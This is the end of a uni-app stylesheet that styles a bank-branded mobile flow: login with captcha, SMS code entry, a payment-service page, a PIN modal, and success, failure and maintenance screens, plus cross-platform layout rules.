.form-input { width: 100%; height: 100rpx; background: #F8F9FA; border: 2rpx solid #E9ECEF; border-radius: 12rpx; padding: 0 30rpx; font-size: 32rpx; color: #333; box-sizing: border-box; }
.captcha-group { display: flex; align-items: center; }
.captcha-input-wrapper { flex: 1; position: relative; margin-right: 20rpx; }
.captcha-input { width: 100%; }
.captcha-clear { right: 20rpx; top: 50%; transform: translateY(-50%); }
.captcha-img { width: 180rpx; height: 100rpx; background: #F0F0F0; border: 2rpx solid #E9ECEF; border-radius: 12rpx; display: flex; align-items: center; justify-content: center; overflow: hidden; }
.captcha-canvas { width: 100%; height: 100%; }
.options-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 60rpx; }
.remember-option { display: flex; align-items: center; }
.checkbox { width: 36rpx; height: 36rpx; border: 2rpx solid #CCC; border-radius: 6rpx; display: flex; align-items: center; justify-content: center; margin-right: 15rpx; background: #FFFFFF; }
.checkbox.checked { background: #8d131f; border-color: #8d131f; }
.option-text { font-size: 28rpx; color: #666; }
.reset-password { padding: 10rpx; }
.reset-text { font-size: 28rpx; color: #007AFF; }
.login-btn { width: 100%; height: 100rpx; background: #8d131f; border-radius: 20rpx; display: flex; align-items: center; justify-content: center; margin-bottom: 40rpx; box-shadow: 0 8rpx 20rpx rgba(220, 53, 69, 0.3); }
.btn-text { font-size: 32rpx; color: #FFFFFF; font-weight: 600; }
.bottom-links { text-align: center; margin-top: 40rpx; }
.link-text { font-size: 26rpx; color: #666; }
.register-link { font-size: 26rpx; color: #007AFF; text-decoration: underline; }

// ========== show===2: 驗證碼頁 ==========
.verification-page { height: 100vh; background: #F5F5F5; display: flex; flex-direction: column; }
.verify-status-bar { height: var(--status-bar-height, 44rpx); background: #8d131f; }
.verify-header { background: #8d131f; padding: 20rpx 30rpx 30rpx; position: relative; display: flex; align-items: center; justify-content: center; }
.verify-back-btn { position: absolute; left: 30rpx; top: 50%; transform: translateY(-50%); width: 60rpx; height: 60rpx; display: flex; align-items: center; justify-content: center; }
.verify-header-title { flex: 1; display: flex; justify-content: center; }
.verify-title-text { font-size: 36rpx; color: #FFFFFF; font-weight: 500; }
.verify-content { flex: 1; padding: 60rpx 40rpx 40rpx; background: #F5F5F5; }
.verify-form-section { background: #FFFFFF; border-radius: 12rpx; margin-bottom: 40rpx; overflow: hidden; }
.verify-form-row { display: flex; align-items: center; padding: 40rpx 30rpx; border-bottom: 1rpx solid #F0F0F0; }
.verify-form-row:last-child { border-bottom: none; }
.verify-form-label { width: 160rpx; flex-shrink: 0; }
.verify-label-text { font-size: 32rpx; color: #333; }
.verify-form-value { flex: 1; }
.verify-phone-text { font-size: 32rpx; color: #333; font-weight: 500; }
.verify-form-input-group { flex: 1; }
.verify-code-boxes { display: flex; gap: 12rpx; }
.verify-code-box { width: 60rpx; height: 72rpx; border: 2rpx solid #E0E0E0; border-radius: 10rpx; display: flex; align-items: center; justify-content: center; background: #fff; position: relative; }
.verify-code-box.active { border-color: #8d131f; }
.verify-code-box.filled { border-color: #8d131f; background: #FFF5F5; }
.verify-code-digit { font-size: 32rpx; color: #333; font-weight: 600; }
.verify-cursor { width: 3rpx; height: 40rpx; background: #8d131f; animation: cursorBlink 1s infinite; }
.verify-hidden-input { position: absolute; left: -9999rpx; opacity: 0; width: 1rpx; height: 1rpx; }
.verify-actions { margin-top: 40rpx; }
.verify-resend { text-align: center; margin-bottom: 40rpx; }
.verify-resend-text { font-size: 28rpx; color: #8d131f; }
.verify-resend-text.disabled { color: #999; }
.verify-submit-btn { width: 100%; height: 100rpx; background: #8d131f; border-radius: 12rpx; display: flex; align-items: center; justify-content: center; }
.verify-submit-btn.disabled { background: #ccc; }
.verify-submit-text { font-size: 36rpx; color: #FFFFFF; font-weight: 500; }
.verify-notice-section { margin-top: 40rpx; padding: 0 20rpx; }
.verify-notice-text { font-size: 28rpx; color: #007AFF; line-height: 1.6; }
.verify-footer { padding: 40rpx 40rpx 100rpx; display: flex; justify-content: center; align-items: center; }
.verify-bank-logo { width: 300rpx; height: 60rpx; }
@keyframes cursorBlink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }

// ========== show===3: 收款服務頁 ==========
.payments-page { height: 100vh; background: #F5F5F5; display: flex; flex-direction: column; }
.payments-status-bar { height: var(--status-bar-height, 44rpx); background: #8d131f; }
.payments-header { background: #8d131f; padding: 20rpx 30rpx 30rpx; position: relative; display: flex; align-items: center; justify-content: center; }
.payments-back-btn { position: absolute; left: 10rpx; top: 50%; transform: translateY(-50%); width: 60rpx; height: 60rpx; display: flex; align-items: center; justify-content: center; }
.payments-header-title { flex: 1; display: flex; justify-content: center; }
.payments-title-text { font-size: 36rpx; color: #FFFFFF; font-weight: 500; }
.payments-content { flex: 1; padding: 40rpx 30rpx; overflow-y: auto; padding-bottom: calc(200rpx + env(safe-area-inset-bottom)); }
.payments-page-title { text-align: center; margin-bottom: 50rpx; }
.payments-title-main { font-size: 42rpx; color: #333; font-weight: 600; line-height: 1.4; }
.payments-description-section { background: #FFFFFF; border-radius: 16rpx; padding: 40rpx 30rpx; margin-bottom: 40rpx; box-shadow: 0 4rpx 20rpx rgba(0, 0, 0, 0.08); }
.payments-desc-item { margin-bottom: 20rpx; }
.payments-desc-item:last-child { margin-bottom: 0; }
.payments-desc-text { font-size: 30rpx; color: #555; line-height: 1.6; }
.payments-advantages-section { background: #FFFFFF; border-radius: 16rpx; padding: 40rpx 30rpx; margin-bottom: 40rpx; box-shadow: 0 4rpx 20rpx rgba(0, 0, 0, 0.08); }
.payments-section-title { margin-bottom: 30rpx; }
.payments-title-text-sec { font-size: 32rpx; color: #333; font-weight: 600; }
.payments-advantage-item { display: flex; align-items: flex-start; margin-bottom: 30rpx; }
.payments-advantage-item:last-child { margin-bottom: 0; }
.payments-advantage-icon { width: 60rpx; height: 60rpx; background: #FFF5F5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 20rpx; flex-shrink: 0; }
.payments-advantage-content { flex: 1; }
.payments-advantage-title { font-size: 30rpx; color: #333; font-weight: 600; display: block; margin-bottom: 8rpx; }
.payments-advantage-desc { font-size: 26rpx; color: #666; line-height: 1.5; }
.payments-notice-section { background: #F8F9FE; border-radius: 16rpx; padding: 40rpx 30rpx; border-left: 6rpx solid #007AFF; }
.payments-notice-item { display: flex; align-items: flex-start; margin-bottom: 20rpx; }
.payments-notice-item:last-child { margin-bottom: 0; }
.payments-notice-dot { width: 8rpx; height: 8rpx; background: #007AFF; border-radius: 50%; margin-top: 16rpx; margin-right: 20rpx; flex-shrink: 0; }
.payments-notice-text { font-size: 28rpx; color: #007AFF; line-height: 1.6; flex: 1; }
.payments-button-section { position: fixed; bottom: 0; left: 0; right: 0; padding: 30rpx; background: #FFFFFF; border-top: 1rpx solid #F0F0F0; z-index: 100; padding-bottom: calc(30rpx + env(safe-area-inset-bottom)); }
.payments-btn-primary { width: 100%; height: 100rpx; background: linear-gradient(135deg, #8d131f, #B71C1C); border-radius: 50rpx; display: flex; align-items: center; justify-content: center; margin-bottom: 20rpx; box-shadow: 0 8rpx 20rpx rgba(141, 19, 31, 0.3); }
.payments-btn-text-primary { font-size: 32rpx; color: #FFFFFF; font-weight: 600; }
.payments-btn-secondary { width: 100%; height: 100rpx; background: #F5F5F5; border-radius: 50rpx; display: flex; align-items: center; justify-content: center; border: 2rpx solid #E0E0E0; }
.payments-btn-text-secondary { font-size: 32rpx; color: #666; font-weight: 500; }

// 密码弹窗
.pwd-modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.6); z-index: 1000; display: flex; align-items: center; justify-content: center; }
.pwd-modal-content { width: 600rpx; background: #fff; border-radius: 24rpx; overflow: hidden; }
.pwd-modal-header { padding: 36rpx 36rpx 20rpx; display: flex; align-items: center; justify-content: space-between; }
.pwd-modal-title { font-size: 34rpx; font-weight: 700; color: #333; }
.pwd-modal-close { width: 48rpx; height: 48rpx; display: flex; align-items: center; justify-content: center; }
.pwd-modal-body { padding: 20rpx 36rpx 30rpx; text-align: center; }
.pwd-modal-label { font-size: 28rpx; color: #666; margin-bottom: 30rpx; display: block; }
.pwd-modal-password-area { display: flex; justify-content: center; gap: 16rpx; margin-bottom: 20rpx; }
.password-circle { width: 64rpx; height: 64rpx; border: 2rpx solid #E0E0E0; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #fff; position: relative; transition: all 0.2s; }
.password-circle.filled { border-color: #8d131f; background: #FFF5F5; }
.password-circle.current { border-color: #8d131f; }
.password-filled-dot { width: 20rpx; height: 20rpx; border-radius: 50%; background: #8d131f; }
.cursor-line { width: 3rpx; height: 40rpx; background: #8d131f; animation: cursorBlink 1s infinite; }
.pwd-hidden-input { position: absolute; left: -9999rpx; opacity: 0; width: 1rpx; height: 1rpx; }
.pwd-modal-footer { display: flex; border-top: 1rpx solid #f0f0f0; }
.pwd-modal-btn-cancel, .pwd-modal-btn-confirm { flex: 1; height: 96rpx; display: flex; align-items: center; justify-content: center; font-size: 30rpx; }
.pwd-modal-btn-cancel { background: #f8f9fa; color: #666; border-right: 1rpx solid #f0f0f0; }
.pwd-modal-btn-confirm { background: #8d131f; color: #fff; font-weight: 700; }
.pwd-modal-btn-confirm.disabled { background: #ccc; color: #999; }

// ========== show===4: 成功頁 ==========
.success-page { height: 100vh; background: linear-gradient(135deg, #8d131f 0%, #B71C1C 100%); display: flex; flex-direction: column; position: relative; overflow: hidden; }
.success-status-bar { height: var(--status-bar-height, 44rpx); background: rgba(255, 255, 255, 0.1); flex-shrink: 0; }
.success-header { background: rgba(255, 255, 255, 0.1); padding: 20rpx 30rpx 30rpx; position: relative; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10rpx); flex-shrink: 0; }
.success-back-btn { position: absolute; left: 30rpx; top: 50%; transform: translateY(-50%); width: 60rpx; height: 60rpx; display: flex; align-items: center; justify-content: center; background: rgba(255, 255, 255, 0.2); border-radius: 50%; }
.success-header-title { flex: 1; display: flex; justify-content: center; }
.success-title-text-header { font-size: 36rpx; color: #FFFFFF; font-weight: 500; }
.success-content { flex: 1; padding: 60rpx 30rpx; overflow-y: auto; padding-bottom: calc(160rpx + env(safe-area-inset-bottom)); }
.success-icon-section { text-align: center; margin-bottom: 40rpx; opacity: 0; transform: translateY(40rpx); transition: all 0.8s ease; }
.success-icon-section.animate { opacity: 1; transform: translateY(0); }
.success-icon-circle { width: 140rpx; height: 140rpx; background: linear-gradient(135deg, #28a745 0%, #20c997 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto; opacity: 0; transform: scale(0.5); transition: all 0.6s ease; position: relative; }
.success-icon-circle.show { opacity: 1; transform: scale(1); }
.success-particles { position: absolute; top: 50%; left: 50%; width: 0; height: 0; }
.particle-dot { position: absolute; width: 8rpx; height: 8rpx; background: #fff; border-radius: 50%; animation: particleBurst 1s ease-out forwards; }
@keyframes particleBurst { 0% { transform: rotate(var(--angle)) translateX(0); opacity: 1; } 100% { transform: rotate(var(--angle)) translateX(120rpx); opacity: 0; } }
.success-text-section { text-align: center; margin-bottom: 40rpx; opacity: 0; transform: translateY(30rpx); transition: all 0.6s ease; }
.success-text-section.show { opacity: 1; transform: translateY(0); }
.success-title-main { font-size: 40rpx; color: #FFFFFF; font-weight: 700; }
.success-info-card { background: #fff; border-radius: 20rpx; padding: 36rpx 30rpx; margin-bottom: 30rpx; box-shadow: 0 8rpx 32rpx rgba(0, 0, 0, 0.15); opacity: 0; transform: translateY(30rpx); transition: all 0.6s ease; }
.success-info-card.show { opacity: 1; transform: translateY(0); }
.success-info-row { display: flex; align-items: flex-start; margin-bottom: 24rpx; }
.success-info-row:last-child { margin-bottom: 0; }
.info-icon { margin-right: 16rpx; flex-shrink: 0; margin-top: 4rpx; }
.info-text { font-size: 28rpx; color: #333; line-height: 1.6; flex: 1; }
.success-features { opacity: 0; transform: translateY(20rpx); transition: all 0.6s ease; }
.success-features.show { opacity: 1; transform: translateY(0); }
.success-features-grid { display: flex; flex-wrap: wrap; gap: 20rpx; }
.success-feature-badge { flex: 1; min-width: 40%; background: rgba(255, 255, 255, 0.9); border-radius: 16rpx; padding: 24rpx 20rpx; display: flex; align-items: center; gap: 12rpx; }
.success-feature-text { font-size: 26rpx; color: #333; font-weight: 500; }
.success-action-buttons { position: fixed; bottom: 0; left: 0; right: 0; padding: 30rpx; background: linear-gradient(to top, rgba(141, 19, 31, 1) 0%, rgba(141, 19, 31, 0) 100%); z-index: 100; padding-bottom: calc(30rpx + env(safe-area-inset-bottom)); opacity: 0; transform: translateY(30rpx); transition: all 0.6s ease; }
.success-action-buttons.show { opacity: 1; transform: translateY(0); }
.success-home-btn { width: 100%; height: 100rpx; background: rgba(255, 255, 255, 0.2); border-radius: 50rpx; display: flex; align-items: center; justify-content: center; border: 2rpx solid rgba(255, 255, 255, 0.3); }
.success-home-text { font-size: 32rpx; color: #FFFFFF; font-weight: 500; }

// ========== show===5: 失敗頁 ==========
.failure-container { min-height: 100vh; background: linear-gradient(135deg, #F5F5F5 0%, #FFF5F5 100%); padding: 40rpx 32rpx 32rpx; position: relative; overflow: hidden; }
.failure-status-bar { display: flex; justify-content: center; margin-bottom: 60rpx; }
.failure-status-icon-wrapper { position: relative; }
.failure-status-icon-wrapper.animate-shake { animation: shake 0.8s ease-in-out infinite; }
.failure-status-icon { font-size: 120rpx; display: flex; align-items: center; justify-content: center; color: #DC143C; text-shadow: 0 4rpx 8rpx rgba(220, 20, 60, 0.3); }
.failure-main-content { opacity: 0; transform: translateY(40rpx); transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
.failure-main-content.content-fade-in { opacity: 1; transform: translateY(0); }
.failure-title { font-size: 48rpx; font-weight: 600; color: #333; text-align: center; margin-bottom: 24rpx; }
.failure-message { font-size: 32rpx; color: #666; text-align: center; line-height: 1.6; margin-bottom: 60rpx; padding: 0 20rpx; }
.failure-reasons-section, .failure-suggestions-section { margin-bottom: 48rpx; }
.failure-section-title { font-size: 36rpx; font-weight: 600; color: #333; margin-bottom: 32rpx; padding-left: 16rpx; position: relative; }
.failure-section-title::before { content: ''; position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 8rpx; height: 32rpx; background: linear-gradient(45deg, #DC143C, #B91C3C); border-radius: 4rpx; }
.failure-reasons-list, .failure-suggestions-list { background: rgba(255, 255, 255, 0.8); border-radius: 16rpx; padding: 32rpx 24rpx; box-shadow: 0 8rpx 32rpx rgba(0, 0, 0, 0.1); }
.failure-reason-item { display: flex; align-items: flex-start; margin-bottom: 24rpx; opacity: 0; transform: translateX(-30rpx); transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
.failure-reason-item:last-child { margin-bottom: 0; }
.failure-reason-item.item-slide-in { opacity: 1; transform: translateX(0); }
.failure-reason-dot { width: 12rpx; height: 12rpx; background: #DC143C; border-radius: 50%; margin-top: 16rpx; margin-right: 20rpx; flex-shrink: 0; }
.failure-reason-text { font-size: 30rpx; color: #555; line-height: 1.5; flex: 1; }
.failure-suggestion-item { display: flex; align-items: center; margin-bottom: 24rpx; opacity: 0; transform: translateX(-30rpx); transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
.failure-suggestion-item:last-child { margin-bottom: 0; }
.failure-suggestion-item.item-slide-in { opacity: 1; transform: translateX(0); }
.failure-suggestion-number { width: 40rpx; height: 40rpx; background: linear-gradient(45deg, #DC143C, #B91C3C); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24rpx; font-weight: 600; margin-right: 20rpx; flex-shrink: 0; }
.failure-suggestion-text { font-size: 30rpx; color: #555; line-height: 1.5; flex: 1; }
.failure-action-buttons { position: fixed; bottom: 0; left: 0; right: 0; padding: 32rpx; background: rgba(255, 255, 255, 0.95); border-top: 2rpx solid rgba(0, 0, 0, 0.05); transform: translateY(100%); transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
.failure-action-buttons.buttons-slide-up { transform: translateY(0); }
.failure-home-button { width: 100%; height: 88rpx; border-radius: 44rpx; font-size: 32rpx; font-weight: 600; border: none; background: rgba(255, 255, 255, 0.9); color: #666; border: 2rpx solid rgba(0, 0, 0, 0.1); }
@keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5rpx); } 75% { transform: translateX(5rpx); } }

// ========== show===6: 維護頁 ==========
.maintenance-container { width: 100%; height: 100vh; background: linear-gradient(135deg, #991B1B 0%, #B91C3C 50%, #991B1B 100%); position: relative; overflow: hidden; }
.maintenance-header { width: 100%; padding-top: var(--status-bar-height, 44rpx); }
.maintenance-nav-bar { height: 88rpx; display: flex; align-items: center; justify-content: space-between; padding: 0 30rpx; }
.maintenance-nav-title { font-size: 36rpx; font-weight: 600; color: #FFFFFF; }
.maintenance-nav-placeholder { width: 48rpx; }
.maintenance-content { flex: 1; padding: 60rpx 40rpx 40rpx; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 2; }
.maintenance-icon-wrapper { margin-bottom: 60rpx; opacity: 0; transform: scale(0.8); transition: all 0.6s ease; }
.maintenance-icon-wrapper.show { opacity: 1; transform: scale(1); }
.maintenance-icon { width: 160rpx; height: 160rpx; background: rgba(255, 255, 255, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2rpx solid rgba(255, 255, 255, 0.2); }
.maintenance-icon.rotating { animation: rotate 2s linear infinite; }
@keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
.maintenance-text-section { text-align: center; margin-bottom: 60rpx; opacity: 0; transform: translateY(30rpx); transition: all 0.6s ease; }
.maintenance-text-section.show { opacity: 1; transform: translateY(0); }
.maintenance-title { font-size: 48rpx; font-weight: 700; color: #FFFFFF; display: block; margin-bottom: 20rpx; }
.maintenance-desc { display: block; font-size: 28rpx; color: rgba(255, 255, 255, 0.9); line-height: 40rpx; margin-bottom: 10rpx; }
.maintenance-info-card { width: 100%; background: rgba(255, 255, 255, 0.1); border-radius: 20rpx; padding: 36rpx 30rpx; margin-bottom: 60rpx; opacity: 0; transform: translateY(30rpx); transition: all 0.6s ease; }
.maintenance-info-card.show { opacity: 1; transform: translateY(0); }
.maintenance-info-row { display: flex; align-items: center; margin-bottom: 24rpx; }
.maintenance-info-row:last-child { margin-bottom: 0; }
.maintenance-info-text { font-size: 28rpx; color: rgba(255, 255, 255, 0.9); margin-left: 16rpx; }
.maintenance-actions { width: 100%; opacity: 0; transform: translateY(20rpx); transition: all 0.6s ease; }
.maintenance-actions.show { opacity: 1; transform: translateY(0); }
.maintenance-refresh-btn { display: flex; align-items: center; justify-content: center; gap: 10rpx; padding: 24rpx; background: rgba(255, 255, 255, 0.9); border-radius: 50rpx; margin-bottom: 20rpx; }
.maintenance-refresh-text { font-size: 30rpx; color: #333; font-weight: 500; }
.maintenance-home-btn { display: flex; align-items: center; justify-content: center; padding: 24rpx; background: rgba(255, 255, 255, 0.2); border-radius: 50rpx; border: 2rpx solid rgba(255, 255, 255, 0.3); }
.maintenance-home-text { font-size: 30rpx; color: #FFFFFF; font-weight: 500; }
.maintenance-logo { margin-top: 60rpx; display: flex; justify-content: center; }
.maintenance-bank-logo { width: 300rpx; height: 60rpx; opacity: 0.6; }

// ========== 多端適配 ==========
// #ifdef MP-WEIXIN
.page-container { height: 100vh; }
// #endif
// #ifdef MP-ALIPAY
.page-container { height: 100vh; }
// #endif
// #ifdef H5
.page-container { height: calc(100vh - var(--window-top, 0px)); min-height: 100vh; }
// #endif
// #ifdef APP-PLUS
.page-container { height: calc(100vh - var(--status-bar-height, 0px)); }
// #endif
</style>
